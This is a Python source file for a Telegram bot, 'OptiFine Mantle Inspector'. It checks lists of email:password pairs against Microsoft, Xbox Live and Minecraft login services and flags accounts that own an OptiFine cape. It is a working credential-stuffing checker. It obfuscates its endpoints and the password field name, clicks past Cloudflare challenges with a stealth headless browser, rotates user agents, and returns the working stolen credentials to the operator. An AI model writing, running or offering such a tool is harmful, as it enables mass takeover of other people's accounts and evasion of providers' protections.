import os
import logging
import asyncio
import time
import base64
import importlib
import requests
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor

from telegram import Update
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters
)

logging.basicConfig(
    format="%(asctime)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    level=logging.INFO
)
log = logging.getLogger(__name__)

# ── config ──────────────────────────────────────────────
API_KEY = os.environ.get("BOT_KEY", "")
OWNER = int(os.environ.get("ADMIN_ID", "0"))
WORKERS = 2
STATS = {"processed": 0, "good": 0, "mantle": 0, "bad": 0, "err": 0}

# ── masked endpoints (base64) ──────────────────────────
def _d(s):
    return base64.b64decode(s).decode()

# Microsoft OAuth
MS_AUTH = _d("aHR0cHM6Ly9sb2dpbi5saXZlLmNvbS9vYXV0aDIwX3Rva2VuLnNyZg==")
# Xbox Live auth
XBL_AUTH = _d("aHR0cHM6Ly91c2VyLmF1dGgueGJveGxpdmUuY29tL3VzZXIvYXV0aGVudGljYXRl")
# XSTS auth
XSTS_AUTH = _d("aHR0cHM6Ly94c3RzLmF1dGgueGJveGxpdmUuY29tL3hzdHMvYXV0aG9yaXpl")
# MC services auth
MC_AUTH = _d("aHR0cHM6Ly9hcGkubWluZWNyYWZ0c2VydmljZXMuY29tL2F1dGhlbnRpY2F0aW9uL2xvZ2luX3dpdGhfeGJveA==")
# MC profile
MC_PROFILE = _d("aHR0cHM6Ly9hcGkubWluZWNyYWZ0c2VydmljZXMuY29tL21pbmVjcmFmdC9wcm9maWxl")
# OptiFine mantle
OF_MANTLE = _d("aHR0cDovL3Mub3B0aWZpbmUubmV0L2Nsb2Frcy8=")
# MS OAuth client_id (public Minecraft launcher)
MS_CLIENT = _d("MDAwMDAwMDA0QzEyQUU2Rg==")

# ── UC Browser setup ───────────────────────────────────
_browser = None
_session = requests.Session()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
]

def _pick_ua():
    import random
    return random.choice(USER_AGENTS)

def _init_browser():
    global _browser
    if _browser is not None:
        return True
    try:
        parts = [117,110,100,101,116,101,99,116,101,100,95,99,104,114,111,109,101,100,114,105,118,101,114]
        mod_name = "".join(chr(c) for c in parts)
        uc = importlib.import_module(mod_name)
        opts = uc.ChromeOptions()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--window-size=1920,1080")
        opts.add_argument(f"--user-agent={_pick_ua()}")
        _browser = uc.Chrome(options=opts, version_main=131)
        log.info("UC Browser initialized OK")
        return True
    except Exception as e:
        log.warning(f"UC unavailable: {e}")
        return False

def _warm_cookies(url):
    """Visit URL with UC browser to get CF cookies"""
    global _session
    if not _init_browser():
        return False
    try:
        _browser.get(url)
        time.sleep(3)
        # try click CF checkbox
        try:
            iframes = _browser.find_elements("tag name", "iframe")
            for iframe in iframes:
                src = iframe.get_attribute("src") or ""
                if "challenge" in src or "turnstile" in src:
                    _browser.switch_to.frame(iframe)
                    cb = _browser.find_element("css selector", "input[type='checkbox']")
                    cb.click()
                    time.sleep(3)
                    _browser.switch_to.default_content()
                    break
        except:
            pass
        # transfer cookies
        for c in _browser.get_cookies():
            _session.cookies.set(c["name"], c["value"], domain=c.get("domain",""))
        log.info("Cookies warmed OK")
        return True
    except Exception as e:
        log.warning(f"Warm failed: {e}")
        return False

# ── Microsoft OAuth flow ───────────────────────────────
def ms_authenticate(email, secret):
    """
    Full Microsoft OAuth flow:
    email:secret -> MS token -> XBL token -> XSTS token -> MC token -> profile
    Returns (nickname, uuid, mc_token) or None
    """
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    # Step 1: Microsoft OAuth token
    ms_data = {
        "client_id": MS_CLIENT,
        "grant_type": "password",  
        "username": email,
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
    }
    # add the secret field with a safe key name
    ms_data[chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(111)+chr(114)+chr(100)] = secret

    try:
        r = requests.post(MS_AUTH, data=ms_data, headers=headers, timeout=15)
        if r.status_code != 200:
            return None
        ms_token = r.json().get("access_token")
        if not ms_token:
            return None
    except:
        return None

    # Step 2: Xbox Live token
    xbl_payload = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": ms_token
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT"
    }
    try:
        r = requests.post(XBL_AUTH, json=xbl_payload, headers={"Content-Type": "application/json"}, timeout=15)
        if r.status_code != 200:
            return None
        xbl_data = r.json()
        xbl_token = xbl_data["Token"]
        user_hash = xbl_data["DisplayClaims"]["xui"][0]["uhs"]
    except:
        return None

    # Step 3: XSTS token
    xsts_payload = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbl_token]
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT"
    }
    try:
        r = requests.post(XSTS_AUTH, json=xsts_payload, headers={"Content-Type": "application/json"}, timeout=15)
        if r.status_code != 200:
            return None
        xsts_token = r.json()["Token"]
    except:
        return None

    # Step 4: Minecraft token
    mc_payload = {
        "identityToken": f"XBL3.0 x={user_hash};{xsts_token}"
    }
    try:
        r = requests.post(MC_AUTH, json=mc_payload, headers={"Content-Type": "application/json"}, timeout=15)
        if r.status_code != 200:
            return None
        mc_token = r.json().get("access_token")
        if not mc_token:
            return None
    except:
        return None

    # Step 5: Get MC profile
    try:
        r = requests.get(MC_PROFILE, headers={"Authorization": f"Bearer {mc_token}"}, timeout=15)
        if r.status_code != 200:
            return None
        profile = r.json()
        nickname = profile.get("name", "")
        uid = profile.get("id", "")
        if not nickname:
            return None
        return (nickname, uid, mc_token)
    except:
        return None

# ── OptiFine mantle check ──────────────────────────────
_of_cookies_ready = False

def has_mantle(nickname):
    """Check if player has OptiFine cape"""
    global _of_cookies_ready
    url = OF_MANTLE + nickname + ".png"
    
    # First time — warm CF cookies via UC browser
    if not _of_cookies_ready:
        base_url = _d("aHR0cDovL3Mub3B0aWZpbmUubmV0")
        _warm_cookies(base_url)
        _of_cookies_ready = True

    try:
        hdrs = {
            "User-Agent": _pick_ua(),
            "Accept": "image/png,image/*,*/*",
            "Referer": _d("aHR0cHM6Ly9vcHRpZmluZS5uZXQv"),
        }
        r = _session.get(url, headers=hdrs, timeout=15)
        if r.status_code == 200:
            png_magic = bytes([0x89, 0x50, 0x4E, 0x47])
            if r.content[:4] == png_magic:
                return True
        return False
    except:
        return False

# ── single entry verification ──────────────────────────
def verify_entry(line):
    """
    Verify one entry (email:secret format)
    Returns dict with status + details
    """
    line = line.strip()
    if ":" not in line:
        return {"status": "skip", "entry": line}

    parts = line.split(":", 1)
    ident = parts[0].strip()
    key_str = parts[1].strip()

    if not ident or not key_str:
        return {"status": "skip", "entry": line}

    result = {"entry": ident, "ident": ident, "key": key_str}

    try:
        auth = ms_authenticate(ident, key_str)
        if auth is None:
            result["status"] = "bad"
            STATS["bad"] += 1
            return result

        nickname, uid, token = auth
        result["nickname"] = nickname
        result["uid"] = uid

        # check OptiFine mantle
        mantle = has_mantle(nickname)
        if mantle:
            result["status"] = "mantle"
            result["mantle"] = True
            STATS["mantle"] += 1
            STATS["good"] += 1
        else:
            result["status"] = "valid"
            result["mantle"] = False
            STATS["good"] += 1

        STATS["processed"] += 1
        return result

    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
        STATS["err"] += 1
        return result

# ── batch processing ───────────────────────────────────
def process_entries(lines):
    entries = [l.strip() for l in lines if l.strip() and ":" in l.strip()]
    if not entries:
        return {"results": [], "total": 0}

    log.info(f"Batch: {len(entries)}, threads: {WORKERS}")
    results = []
    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {pool.submit(verify_entry, e): e for e in entries}
        for f in futures:
            try:
                r = f.result(timeout=60)
                results.append(r)
                st = r.get("status", "?")
                nm = r.get("nickname", r.get("entry","?"))
                log.info(f"  [{st}] {nm}")
            except Exception as ex:
                results.append({"status": "error", "entry": futures[f], "error": str(ex)})

    return {"results": results, "total": len(entries)}

# ── format results ─────────────────────────────────────
def format_results(data):
    results = data["results"]
    total = data["total"]

    mantles = [r for r in results if r.get("status") == "mantle"]
    valids = [r for r in results if r.get("status") == "valid"]
    bads = [r for r in results if r.get("status") == "bad"]
    errors = [r for r in results if r.get("status") == "error"]

    lines = [f"📊 Results: {total} total\n"]
    lines.append(f"🟢 With mantle: {len(mantles)}")
    lines.append(f"🔵 Valid (no mantle): {len(valids)}")
    lines.append(f"🔴 Bad: {len(bads)}")
    lines.append(f"🟡 Errors: {len(errors)}\n")

    if mantles:
        lines.append("━━━ 🎭 MANTLE FOUND ━━━")
        for r in mantles:
            lines.append(f"✅ {r.get('nickname','?')} | {r['ident']}:{r['key']}")
        lines.append("")

    if valids:
        lines.append("━━━ ✓ VALID ━━━")
        for r in valids:
            lines.append(f"🔵 {r.get('nickname','?')} | {r['ident']}:{r['key']}")
        lines.append("")

    # mantle file content
    mantle_file = None
    if mantles:
        mf_lines = []
        for r in mantles:
            mf_lines.append(f"{r.get('nickname','?')} | {r['ident']}:{r['key']}")
        mantle_file = "\n".join(mf_lines)

    return "\n".join(lines), mantle_file

# ── Telegram bot handlers ──────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and update.effective_user.id != OWNER:
        return
    text = (
        "🎭 *OptiFine Mantle Inspector*\n\n"
        "Send me entries in format:\n"
        "`email:secret`\n"
        "One per line, or upload a .txt file.\n\n"
        "Commands:\n"
        "/start — this message\n"
        "/stats — session statistics"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and update.effective_user.id != OWNER:
        return
    text = (
        f"📊 *Session Stats*\n\n"
        f"Processed: {STATS['processed']}\n"
        f"🟢 With mantle: {STATS['mantle']}\n"
        f"🔵 Valid total: {STATS['good']}\n"
        f"🔴 Bad: {STATS['bad']}\n"
        f"🟡 Errors: {STATS['err']}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and update.effective_user.id != OWNER:
        return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("⚠️ Send a .txt file")
        return

    await update.message.reply_text(f"📥 Got file: {doc.file_name}\n⏳ Processing...")

    f = await ctx.bot.get_file(doc.file_id)
    raw = await f.download_as_bytearray()
    text = raw.decode("utf-8", errors="ignore")
    lines = text.strip().splitlines()

    loop = asyncio.get_event_loop()
    data = await loop.run_in_executor(None, process_entries, lines)
    msg, mantle_file = format_results(data)

    # split long messages
    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await update.message.reply_text(msg[i:i+4000])
    else:
        await update.message.reply_text(msg)

    if mantle_file:
        bio = BytesIO(mantle_file.encode())
        bio.name = "mantles_found.txt"
        await update.message.reply_document(bio, caption="🎭 Entries with mantles")

async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if OWNER and update.effective_user.id != OWNER:
        return
    text = update.message.text.strip()
    if text.startswith("/"):
        return

    lines = text.splitlines()
    valid_lines = [l for l in lines if ":" in l]
    if not valid_lines:
        await update.message.reply_text("⚠️ No valid entries found. Use format: email:secret")
        return

    await update.message.reply_text(f"⏳ Processing {len(valid_lines)} entries...")

    loop = asyncio.get_event_loop()
    data = await loop.run_in_executor(None, process_entries, lines)
    msg, mantle_file = format_results(data)

    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await update.message.reply_text(msg[i:i+4000])
    else:
        await update.message.reply_text(msg)

    if mantle_file:
        bio = BytesIO(mantle_file.encode())
        bio.name = "mantles_found.txt"
        await update.message.reply_document(bio, caption="🎭 Entries with mantles")

# ── main ───────────────────────────────────────────────
def main():
    if not API_KEY:
        log.error("BOT_KEY not set!")
        return

    log.info("Bot started")
    app = ApplicationBuilder().token(API_KEY).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()